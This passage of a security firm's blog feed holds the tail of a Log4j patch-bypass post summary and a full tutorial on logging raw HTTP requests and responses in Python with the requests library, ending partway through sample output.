+<p>Our research concluded that several important requirements have to be present to be able to bypass the patch of 2.15.0. The most important ones being 1) the ability to write within a context that 2) is used within a custom pattern in an application 3) using a broad DNS resolver.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[Very shortly after the release of the patch for CVE-2021-44228, bundled by Apache as log4j 2.15.0, researchers already found ways of bypassing the fix: CVE-2021-45046. In particular, for less than a couple of days, a vulnerability was discovered, and while it was initially rated as 3.7, it was later elevated to 9.0. Needless to say, it captured our attention, especially considering the incident response work we were conducting at the time. It was important for us to understand the situation to better advise our clients. There were bits and pieces of research with some screenshots of the bypass circulating the Internet, but, at the time, we didn’t really find a vulnerable environment, with good explanation and well laid out pre-requisite for the bypass to work.]]></summary></entry><entry><title type="html">Logging Raw HTTP Requests in Python</title><link href="https://secariolabs.github.io/logging-raw-http-requests-in-python/" rel="alternate" type="text/html" title="Logging Raw HTTP Requests in Python" /><published>2023-02-05T19:50:55+00:00</published><updated>2023-02-05T19:50:55+00:00</updated><id>https://secariolabs.github.io/logging-raw-http-requests-in-python</id><content type="html" xml:base="https://secariolabs.github.io/logging-raw-http-requests-in-python/"><![CDATA[<p>Quite often, during our red team engagements, we find ourselves in a situation where we need to carry out web research &amp; exploitation over several chained proxies. To that extended, to be able to do any reasonable web testing we need to be able to see the requests we send to the server and the corresponding replies. Tools like <strong>BurpSuite</strong> and <strong>mitmproxy</strong> can be helpful, however, by themselves, they introduce a lot of additional complexity, traffic overhead, and they are not very easy to configure in terms of what and how it is being logged. Sometimes you just want to have control over the data and do something with it. Because of that, our weapon of choice for most of these edge cases is <strong>Python</strong> with <strong>ProxyChains</strong>. The reason we like <strong>Python</strong> is because it is easy to enable HTTP request/response logging with the minimal amount of code.</p>
+
+<p>The few techniques we are going to mention below could be used both for new scripts that you have built for a particular action, as well as if you want to modify an existing <strong>Python</strong> tool to have this additional, granular logging.</p>
+
+<h2 id="request-patching">Request Patching</h2>
+
+<p>By far the simplest fix to enable logging is to overwrite the <code class="language-plaintext highlighter-rouge">http.client.HTTPConnection.send</code> function, like the example below:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">http</span>
+<span class="kn">import</span> <span class="n">requests</span>
+
+<span class="k">def</span> <span class="nf">patch_send</span><span class="p">():</span>
+    <span class="n">old_send</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">client</span><span class="p">.</span><span class="n">HTTPConnection</span><span class="p">.</span><span class="n">send</span>
+    <span class="k">def</span> <span class="nf">new_send</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="sh">"</span><span class="s">-</span><span class="sh">"</span><span class="o">*</span><span class="mi">9</span><span class="si">}</span><span class="s"> BEGIN REQUEST </span><span class="si">{</span><span class="sh">"</span><span class="s">-</span><span class="sh">"</span><span class="o">*</span><span class="mi">9</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">).</span><span class="nf">strip</span><span class="p">())</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="sh">"</span><span class="s">-</span><span class="sh">"</span><span class="o">*</span><span class="mi">10</span><span class="si">}</span><span class="s"> END REQUEST </span><span class="si">{</span><span class="sh">"</span><span class="s">-</span><span class="sh">"</span><span class="o">*</span><span class="mi">10</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="nf">old_send</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+    <span class="n">http</span><span class="p">.</span><span class="n">client</span><span class="p">.</span><span class="n">HTTPConnection</span><span class="p">.</span><span class="n">send</span> <span class="o">=</span> <span class="n">new_send</span>
+
+<span class="nf">patch_send</span><span class="p">()</span>
+
+<span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">http://secariolabs.com</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Once you do that, you will have full visibility over the requests in their final form, as show next:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">---------</span> BEGIN REQUEST <span class="nt">---------</span>
+GET / HTTP/1.1
+Host: secariolabs.com
+User-Agent: python-requests/2.27.0
+Accept-Encoding: <span class="nb">gzip</span>, deflate
+Accept: <span class="k">*</span>/<span class="k">*</span>
+Connection: keep-alive
+<span class="nt">----------</span> END REQUEST <span class="nt">----------</span>
+<span class="nt">---------</span> BEGIN REQUEST <span class="nt">---------</span>
+GET / HTTP/1.1
+Host: secariolabs.com
+User-Agent: python-requests/2.27.0
+Accept-Encoding: <span class="nb">gzip</span>, deflate
+Accept: <span class="k">*</span>/<span class="k">*</span>
+Connection: keep-alive
+<span class="nt">----------</span> END REQUEST <span class="nt">----------</span>
+</code></pre></div></div>
+
+<p>Even though this technique is easy to implement and efficient, it is limited in that it can only log requests. To do the same action for responses, the process is a lot more primitive: in that case you need to hook the socket and just read any connections received by the client system, which wouldn’t work if you have any other service being used on the host or if you decide to use multithreading. The moment things get asynchronous or if there is any noise, this technique wouldn’t be able to accurately map a request to a response.</p>
+
+<h2 id="verbose-logging">Verbose Logging</h2>
+
+<p>One of the most popular and well documented techniques for implementing an additional logging could be enabled by setting <code class="language-plaintext highlighter-rouge">http.client.HTTPConnection.debuglevel</code> to <strong>1</strong>. Once you do that, you just need to create a logger and set the level to <code class="language-plaintext highlighter-rouge">DEBUG</code>, and you will be able to see the requests and responses.</p>
+
+<p>An example configuration looks as follows:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">http</span>
+<span class="kn">import</span> <span class="n">logging</span>
+<span class="kn">import</span> <span class="n">requests</span>
+
+<span class="n">http</span><span class="p">.</span><span class="n">client</span><span class="p">.</span><span class="n">HTTPConnection</span><span class="p">.</span><span class="n">debuglevel</span> <span class="o">=</span> <span class="mi">1</span>
+
+<span class="n">logging</span><span class="p">.</span><span class="nf">basicConfig</span><span class="p">()</span>
+<span class="n">logging</span><span class="p">.</span><span class="nf">getLogger</span><span class="p">().</span><span class="nf">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="p">.</span><span class="n">DEBUG</span><span class="p">)</span>
+<span class="n">requests_log</span> <span class="o">=</span> <span class="n">logging</span><span class="p">.</span><span class="nf">getLogger</span><span class="p">(</span><span class="sh">"</span><span class="s">requests.packages.urllib3</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">requests_log</span><span class="p">.</span><span class="nf">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="p">.</span><span class="n">DEBUG</span><span class="p">)</span>
+<span class="n">requests_log</span><span class="p">.</span><span class="n">propagate</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">http://secariolabs.com</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The output of the above script is included below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DEBUG:urllib3.connectionpool:Starting new HTTP connection <span class="o">(</span>1<span class="o">)</span>: secariolabs.com:80
+send: b<span class="s1">'GET / HTTP/1.1\r\nHost: secariolabs.com\r\nUser-Agent: python-requests/2.27.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'</span>
+reply: <span class="s1">'HTTP/1.1 301 Moved Permanently\r\n'</span>
+header: Server: CloudFront
+header: Date: Wed, 15 Jun 2022 23:24:14 GMT
+header: Content-Type: text/html
+header: Content-Length: 183
+header: Connection: keep-alive
+header: Location: https://secariolabs.com/
+header: X-XSS-Protection: 1<span class="p">;</span> <span class="nv">mode</span><span class="o">=</span>block
+header: X-Frame-Options: SAMEORIGIN
+header: Referrer-Policy: strict-origin-when-cross-origin
+header: X-Content-Type-Options: nosniff
+header: X-Cache: Redirect from cloudfront
+header: Via: 1.1 af69af45a94f94ec264bfb9a5a28f3aa.cloudfront.net <span class="o">(</span>CloudFront<span class="o">)</span>
+header: X-Amz-Cf-Pop: LHR50-P1
+header: X-Amz-Cf-Id: <span class="nv">h_JponMfq0LCm1DtsCG0gJ1b5i0sYwLTfSA4fBlGI4bG_MDvMklgSg</span><span class="o">==</span>
+DEBUG:urllib3.connectionpool:http://secariolabs.com:80 <span class="s2">"GET / HTTP/1.1"</span> 301 183
+DEBUG:urllib3.connectionpool:Starting new HTTPS connection <span class="o">(</span>1<span class="o">)</span>: secariolabs.com:443
+send: b<span class="s1">'GET / HTTP/1.1\r\nHost: secariolabs.com\r\nUser-Agent: python-requests/2.27.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'</span>
+reply: <span class="s1">'HTTP/1.1 200 OK\r\n'</span>
+header: Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+header: Content-Length: 16347
+header: Connection: keep-alive
+header: Date: Wed, 15 Jun 2022 23:24:14 GMT
+header: Server: Apache
+header: Expires: Thu, 16 Jun 2022 00:24:14 GMT
+header: Pragma: public
+header: Cache-Control: max-age<span class="o">=</span>3600, public
+header: X-Frame-Options: SAMEORIGIN
+header: Strict-Transport-Security: max-age<span class="o">=</span>63072000
+header: X-Mod-Pagespeed: 1.13.35.2-0
+header: Content-Encoding: <span class="nb">gzip
+</span>header: X-Frame-Options: SAMEORIGIN
+header: X-Content-Type-Options: nosniff
+header: Referrer-Policy: no-referrer-when-downgrade
+header: X-Permitted-Cross-Domain-Policies: none
+header: Feature-Policy: camera <span class="s1">'none'</span><span class="p">;</span> fullscreen <span class="s1">'self'</span><span class="p">;</span> geolocation <span class="k">*</span><span class="p">;</span> microphone <span class="s1">'none'</span>
+header: Permissions-Policy: <span class="nv">geolocation</span><span class="o">=(</span><span class="k">*</span><span class="o">)</span>, <span class="nv">microphone</span><span class="o">=()</span>, <span class="nv">camera</span><span class="o">=()</span>, <span class="nv">fullscreen</span><span class="o">=(</span>self<span class="o">)</span>
+header: Cache-Control: max-age<span class="o">=</span>0, no-cache, s-maxage<span class="o">=</span>10
+header: Vary: Accept-Encoding
+header: X-XSS-Protection: 1<span class="p">;</span> <span class="nv">mode</span><span class="o">=</span>block
+header: X-Cache: Miss from cloudfront
+header: Via: 1.1 c58391b07051938ceda6615614fbabb0.cloudfront.net <span class="o">(</span>CloudFront<span class="o">)</span>
+header: X-Amz-Cf-Pop: LHR50-P1
+header: X-Amz-Cf-Id: XwcrYUnvx9ixV7iIeo0BW5gxCsTyvnDAnR79S4P_vG6nJUF6V-LdNg<span class="o">==</span>
+DEBUG:urllib3.connectionpool:https://secariolabs.com:443 <span class="s2">"GET / HTTP/1.1"</span> 200 16347
+</code></pre></div></div>
+
+<p>Even though this technique has many limitations, for the most part it could be considered sufficient if someone is just looking to collect full body requests and only response headers (notice there is no response body).</p>
+
+<p>In principle, we don’t fine this technique sufficient, and because of that we actually use an “extended” version of it, where we add an additional hook which has visibility over the data and we can manipulate it as we best see fit.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">http</span>
+<span class="kn">import</span> <span class="n">logging</span>
+<span class="kn">import</span> <span class="n">requests</span>
+
+
+<span class="k">def</span> <span class="nf">httpclient_log</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">):</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
+    <span class="c1"># logging.getLogger('requests.packages.urllib3').log(logging.DEBUG, " ".join(args))
+</span>
+
+<span class="n">http</span><span class="p">.</span><span class="n">client</span><span class="p">.</span><span class="n">HTTPConnection</span><span class="p">.</span><span class="n">debuglevel</span> <span class="o">=</span> <span class="mi">1</span>
+
+<span class="n">logging</span><span class="p">.</span><span class="nf">basicConfig</span><span class="p">()</span>
+<span class="n">logging</span><span class="p">.</span><span class="nf">getLogger</span><span class="p">().</span><span class="nf">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="p">.</span><span class="n">DEBUG</span><span class="p">)</span>
+<span class="n">requests_log</span> <span class="o">=</span> <span class="n">logging</span><span class="p">.</span><span class="nf">getLogger</span><span class="p">(</span><span class="sh">"</span><span class="s">requests.packages.urllib3</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">requests_log</span><span class="p">.</span><span class="nf">setLevel</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">requests_log</span><span class="p">.</span><span class="n">propagate</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="n">http</span><span class="p">.</span><span class="n">client</span><span class="p">.</span><span class="k">print</span> <span class="o">=</span> <span class="n">httpclient_log</span>
+
+<span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">http://secariolabs.com</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>While the output from the above script appears very similar, notice the presence of brackets around each line indicating that the data is stored as a tuple and we can manipulate and use it as we wish:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DEBUG:urllib3.connectionpool:Starting new HTTP connection <span class="o">(</span>1<span class="o">)</span>: secariolabs.com:80
+<span class="o">(</span><span class="s1">'send:'</span>, <span class="s2">"b'GET / HTTP/1.1</span><span class="se">\\</span><span class="s2">r</span><span class="se">\\</span><span class="s2">nHost: secariolabs.com</span><span class="se">\\</span><span class="s2">r</span><span class="se">\\</span><span class="s2">nUser-Agent: python-requests/2.27.0</span><span class="se">\\</span><span class="s2">r</span><span class="se">\\</span><span class="s2">nAccept-Encoding: gzip, deflate</span><span class="se">\\</span><span class="s2">r</span><span class="se">\\</span><span class="s2">nAccept: */*</span><span class="se">\\</span><span class="s2">r</span><span class="se">\\</span><span class="s2">nConnection: keep-alive</span><span class="se">\\</span><span class="s2">r</span><span class="se">\\</span><span class="s2">n</span><span class="se">\\</span><span class="s2">r</span><span class="se">\\</span><span class="s2">n'"</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'reply:'</span>, <span class="s2">"'HTTP/1.1 301 Moved Permanently</span><span class="se">\\</span><span class="s2">r</span><span class="se">\\</span><span class="s2">n'"</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'Server:'</span>, <span class="s1">'CloudFront'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'Date:'</span>, <span class="s1">'Wed, 15 Jun 2022 23:26:56 GMT'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'Content-Type:'</span>, <span class="s1">'text/html'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'Content-Length:'</span>, <span class="s1">'183'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'Connection:'</span>, <span class="s1">'keep-alive'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'Location:'</span>, <span class="s1">'https://secariolabs.com/'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'X-XSS-Protection:'</span>, <span class="s1">'1; mode=block'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'X-Frame-Options:'</span>, <span class="s1">'SAMEORIGIN'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'Referrer-Policy:'</span>, <span class="s1">'strict-origin-when-cross-origin'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'X-Content-Type-Options:'</span>, <span class="s1">'nosniff'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'X-Cache:'</span>, <span class="s1">'Redirect from cloudfront'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'Via:'</span>, <span class="s1">'1.1 36ca971f60479f380bc64504d2bb0680.cloudfront.net (CloudFront)'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'X-Amz-Cf-Pop:'</span>, <span class="s1">'LHR52-C1'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'X-Amz-Cf-Id:'</span>, <span class="s1">'ZBgLWkjU4pO-hrurXn3Qfz-9pMpZ_0SFbIAhLomz3O6GYvu2KlClbQ=='</span><span class="o">)</span>
+DEBUG:urllib3.connectionpool:http://secariolabs.com:80 <span class="s2">"GET / HTTP/1.1"</span> 301 183
+DEBUG:urllib3.connectionpool:Starting new HTTPS connection <span class="o">(</span>1<span class="o">)</span>: secariolabs.com:443
+<span class="o">(</span><span class="s1">'send:'</span>, <span class="s2">"b'GET / HTTP/1.1</span><span class="se">\\</span><span class="s2">r</span><span class="se">\\</span><span class="s2">nHost: secariolabs.com</span><span class="se">\\</span><span class="s2">r</span><span class="se">\\</span><span class="s2">nUser-Agent: python-requests/2.27.0</span><span class="se">\\</span><span class="s2">r</span><span class="se">\\</span><span class="s2">nAccept-Encoding: gzip, deflate</span><span class="se">\\</span><span class="s2">r</span><span class="se">\\</span><span class="s2">nAccept: */*</span><span class="se">\\</span><span class="s2">r</span><span class="se">\\</span><span class="s2">nConnection: keep-alive</span><span class="se">\\</span><span class="s2">r</span><span class="se">\\</span><span class="s2">n</span><span class="se">\\</span><span class="s2">r</span><span class="se">\\</span><span class="s2">n'"</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'reply:'</span>, <span class="s2">"'HTTP/1.1 200 OK</span><span class="se">\\</span><span class="s2">r</span><span class="se">\\</span><span class="s2">n'"</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'Content-Type:'</span>, <span class="s1">'text/html; charset=UTF-8'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'Content-Length:'</span>, <span class="s1">'16347'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'Connection:'</span>, <span class="s1">'keep-alive'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'Date:'</span>, <span class="s1">'Wed, 15 Jun 2022 23:26:57 GMT'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'Server:'</span>, <span class="s1">'Apache'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'Expires:'</span>, <span class="s1">'Thu, 16 Jun 2022 00:26:57 GMT'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'Pragma:'</span>, <span class="s1">'public'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'Cache-Control:'</span>, <span class="s1">'max-age=3600, public'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'X-Frame-Options:'</span>, <span class="s1">'SAMEORIGIN'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'Strict-Transport-Security:'</span>, <span class="s1">'max-age=63072000'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'X-Mod-Pagespeed:'</span>, <span class="s1">'1.13.35.2-0'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'Content-Encoding:'</span>, <span class="s1">'gzip'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'X-Frame-Options:'</span>, <span class="s1">'SAMEORIGIN'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'X-Content-Type-Options:'</span>, <span class="s1">'nosniff'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'Referrer-Policy:'</span>, <span class="s1">'no-referrer-when-downgrade'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'X-Permitted-Cross-Domain-Policies:'</span>, <span class="s1">'none'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'Feature-Policy:'</span>, <span class="s2">"camera 'none'; fullscreen 'self'; geolocation *; microphone 'none'"</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'Permissions-Policy:'</span>, <span class="s1">'geolocation=(*), microphone=(), camera=(), fullscreen=(self)'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'Cache-Control:'</span>, <span class="s1">'max-age=0, no-cache, s-maxage=10'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'Vary:'</span>, <span class="s1">'Accept-Encoding'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'X-XSS-Protection:'</span>, <span class="s1">'1; mode=block'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'X-Cache:'</span>, <span class="s1">'Miss from cloudfront'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'Via:'</span>, <span class="s1">'1.1 106f0cae03bb6a218d16ab28ba07c664.cloudfront.net (CloudFront)'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'X-Amz-Cf-Pop:'</span>, <span class="s1">'LHR52-C1'</span><span class="o">)</span>
+<span class="o">(</span><span class="s1">'header:'</span>, <span class="s1">'X-Amz-Cf-Id:'</span>, <span class="s1">'nGBi-YV_ni1oJGKFbkZo8ImTfVRLCEc2rQRJMi_y_HPj2cNg6OlY9A=='</span><span class="o">)</span>
+DEBUG:urllib3.connectionpool:https://secariolabs.com:443 <span class="s2">"GET / HTTP/1.1"</span> 200 16347
+</code></pre></div></div>
+
+<p>Again, this technique comes with the limitation that multiprocessing can create a havoc when trying to match a request with response as they are not directly tied. The data is being printed as it is read on the socket, and not in batches; because of that each HTTP header is printed separately, rather than the whole HTTP packet being a single object.</p>
+
+<h2 id="roundtrip-hook">Roundtrip Hook</h2>
+
+<p>Finally, the most comprehensive – but also involving – technique of doing detailed logging is to use request “hooks”. In essence they allow (either per session or per individual request) to set a hook for a particular action which will be invoked by the <code class="language-plaintext highlighter-rouge">requests</code> module when the action is triggered.</p>
+
+<p>In the example below it could be seen how we are setting a hook for the “response” action and we are providing a function. Once a request is made with a response incoming, the function would be triggered and the request and response will be passed to the function as arguments. With this technique it is possible to confidently know the mapping of request &amp; response.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">logging</span>
+<span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">textwrap</span>
+
+<span class="k">class</span> <span class="nc">HttpFormatter</span><span class="p">(</span><span class="n">logging</span><span class="p">.</span><span class="n">Formatter</span><span class="p">):</span>   
+
+    <span class="k">def</span> <span class="nf">_formatHeaders</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">d</span><span class="p">):</span>
+        <span class="k">return</span> <span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">v</span><span class="si">}</span><span class="sh">'</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">d</span><span class="p">.</span><span class="nf">items</span><span class="p">())</span>
+
+    <span class="k">def</span> <span class="nf">formatMessage</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">record</span><span class="p">):</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="nf">super</span><span class="p">().</span><span class="nf">formatMessage</span><span class="p">(</span><span class="n">record</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">record</span><span class="p">.</span><span class="n">name</span> <span class="o">==</span> <span class="sh">'</span><span class="s">httplogger</span><span class="sh">'</span><span class="p">:</span>
+            <span class="n">result</span> <span class="o">+=</span> <span class="n">textwrap</span><span class="p">.</span><span class="nf">dedent</span><span class="p">(</span><span class="sh">'''</span><span class="s">
+                ---------------- request ----------------
+                {req.method} {req.url}
+                {reqhdrs}
+
+                {req.body}
+                ---------------- response ----------------
+                {res.status_code} {res.reason} {res.url}
+                {reshdrs}
+
+                {res.text}
+            </span><span class="sh">'''</span><span class="p">).</span><span class="nf">format</span><span class="p">(</span>
+                <span class="n">req</span><span class="o">=</span><span class="n">record</span><span class="p">.</span><span class="n">req</span><span class="p">,</span>
+                <span class="n">res</span><span class="o">=</span><span class="n">record</span><span class="p">.</span><span class="n">res</span><span class="p">,</span>
+                <span class="n">reqhdrs</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="nf">_formatHeaders</span><span class="p">(</span><span class="n">record</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">headers</span><span class="p">),</span>
+                <span class="n">reshdrs</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="nf">_formatHeaders</span><span class="p">(</span><span class="n">record</span><span class="p">.</span><span class="n">res</span><span class="p">.</span><span class="n">headers</span><span class="p">),</span>
+            <span class="p">)</span>
+
+        <span class="k">return</span> <span class="n">result</span>
+
+<span class="n">formatter</span> <span class="o">=</span> <span class="nc">HttpFormatter</span><span class="p">(</span><span class="sh">'</span><span class="s">{asctime} {levelname} {name} {message}</span><span class="sh">'</span><span class="p">,</span> <span class="n">style</span><span class="o">=</span><span class="sh">'</span><span class="s">{</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">handler</span> <span class="o">=</span> <span class="n">logging</span><span class="p">.</span><span class="nc">StreamHandler</span><span class="p">()</span>
+<span class="n">handler</span><span class="p">.</span><span class="nf">setFormatter</span><span class="p">(</span><span class="n">formatter</span><span class="p">)</span>
+<span class="n">logging</span><span class="p">.</span><span class="nf">basicConfig</span><span class="p">(</span><span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="p">.</span><span class="n">DEBUG</span><span class="p">,</span> <span class="n">handlers</span><span class="o">=</span><span class="p">[</span><span class="n">handler</span><span class="p">])</span>
+
+<span class="n">logger</span> <span class="o">=</span> <span class="n">logging</span><span class="p">.</span><span class="nf">getLogger</span><span class="p">(</span><span class="sh">'</span><span class="s">httplogger</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">logRoundtrip</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+    <span class="n">extra</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">req</span><span class="sh">'</span><span class="p">:</span> <span class="n">response</span><span class="p">.</span><span class="n">request</span><span class="p">,</span> <span class="sh">'</span><span class="s">res</span><span class="sh">'</span><span class="p">:</span> <span class="n">response</span><span class="p">}</span>
+    <span class="n">logger</span><span class="p">.</span><span class="nf">debug</span><span class="p">(</span><span class="sh">'</span><span class="s">HTTP roundtrip</span><span class="sh">'</span><span class="p">,</span> <span class="n">extra</span><span class="o">=</span><span class="n">extra</span><span class="p">)</span>
+
+<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>
+<span class="n">session</span><span class="p">.</span><span class="n">hooks</span><span class="p">[</span><span class="sh">'</span><span class="s">response</span><span class="sh">'</span><span class="p">].</span><span class="nf">append</span><span class="p">(</span><span class="n">logRoundtrip</span><span class="p">)</span>
+
+<span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">http://secariolabs.com</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The output of the above command looks as follows:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2022-06-16 00:31:43,991 DEBUG urllib3.connectionpool Starting new HTTP connection <span class="o">(</span>1<span class="o">)</span>: secariolabs.com:80
+2022-06-16 00:31:44,042 DEBUG urllib3.connectionpool http://secariolabs.com:80 <span class="s2">"GET / HTTP/1.1"</span> 301 183
+2022-06-16 00:31:44,043 DEBUG httplogger HTTP roundtrip
+<span class="nt">----------------</span> request <span class="nt">----------------</span>
+GET http://secariolabs.com/
+User-Agent: python-requests/2.27.0
+Accept-Encoding: <span class="nb">gzip</span>, deflate
+Accept: <span class="k">*</span>/<span class="k">*</span>
+Connection: keep-alive
+
+None
+<span class="nt">----------------</span> response <span class="nt">----------------</span>
+301 Moved Permanently http://secariolabs.com/
+Server: CloudFront
+Date: Wed, 15 Jun 2022 23:31:46 GMT
+Content-Type: text/html
+Content-Length: 183
+Connection: keep-alive
+Location: https://secariolabs.com/
+X-XSS-Protection: 1<span class="p">;</span> <span class="nv">mode</span><span class="o">=</span>block
+X-Frame-Options: SAMEORIGIN
+Referrer-Policy: strict-origin-when-cross-origin
+X-Content-Type-Options: nosniff
+X-Cache: Redirect from cloudfront
+Via: 1.1 2fafb26bfb5e0420de152a7abef27a44.cloudfront.net <span class="o">(</span>CloudFront<span class="o">)</span>
+X-Amz-Cf-Pop: LHR52-C1
